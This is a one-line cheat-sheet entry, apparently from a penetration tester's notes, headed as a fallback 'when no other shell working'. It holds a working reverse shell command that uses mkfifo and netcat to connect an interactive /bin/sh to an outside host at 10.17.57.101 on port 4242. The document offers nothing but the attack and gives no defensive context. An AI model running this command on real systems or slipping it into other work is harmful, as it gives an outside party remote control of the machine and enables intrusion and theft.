## work , when no other shell working , maybe
```
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.17.57.101 4242 >/tmp/f
```